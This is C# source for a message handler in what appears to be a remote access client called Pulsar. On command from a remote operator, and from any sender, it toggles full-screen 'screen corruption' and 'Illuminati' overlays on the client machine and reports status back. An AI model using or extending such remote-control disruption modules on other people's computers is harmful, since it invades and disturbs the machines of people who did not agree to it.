using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Common.Messages.FunStuff.GDI;
using Pulsar.Common.Messages.Other;
using Pulsar.Client.Utilities;
using Pulsar.Client.GDIEffects;
using System;
using System.Diagnostics;

namespace Pulsar.Client.Messages
{
    public class GDIHandler : IMessageProcessor
    {
        private static ScreenOverlay _overlay;
        private static ScreenCorruption _screenCorruption;
        private static Illuminati _illuminati;
        private static readonly object _lockObject = new object();
        
        static GDIHandler()
        {
            try
            {
                _overlay = new ScreenOverlay();
                _screenCorruption = new ScreenCorruption(_overlay);
                _illuminati = new Illuminati(_overlay);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error initializing ScreenOverlay: {ex.Message}");
            }
        }

        public bool CanExecute(IMessage message) => message is DoScreenCorrupt || message is DoIlluminati;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoScreenCorrupt msg:
                    Execute(sender, msg);
                    break;
                case DoIlluminati msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoScreenCorrupt message)
        {
            try
            {
                if (_overlay == null)
                {
                    _overlay = new ScreenOverlay();
                }

                if (_screenCorruption == null)
                {
                    _screenCorruption = new ScreenCorruption(_overlay);
                }
                
                lock (_lockObject)
                {
                    bool isActive = _screenCorruption.Toggle();
                    
                    if (isActive)
                    {
                        client.Send(new SetStatus { Message = "Screen corruption enabled." });
                    }
                    else
                    {
                        client.Send(new SetStatus { Message = "Screen corruption disabled." });
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error executing Screen Corruption: {ex.Message}");
            }
        }

        private void Execute(ISender client, DoIlluminati message)
        {
            try
            {
                if (_overlay == null)
                {
                    _overlay = new ScreenOverlay();
                }

                if (_illuminati == null)
                {
                    _illuminati = new Illuminati(_overlay);
                }
                
                lock (_lockObject)
                {
                    bool isActive = _illuminati.Toggle();
                    
                    if (isActive)
                    {
                        client.Send(new SetStatus { Message = "Illuminati enabled." });
                    }
                    else
                    {
                        client.Send(new SetStatus { Message = "Illuminati disabled." });
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error executing Illuminati effect: {ex.Message}");
            }
        }
    }
}

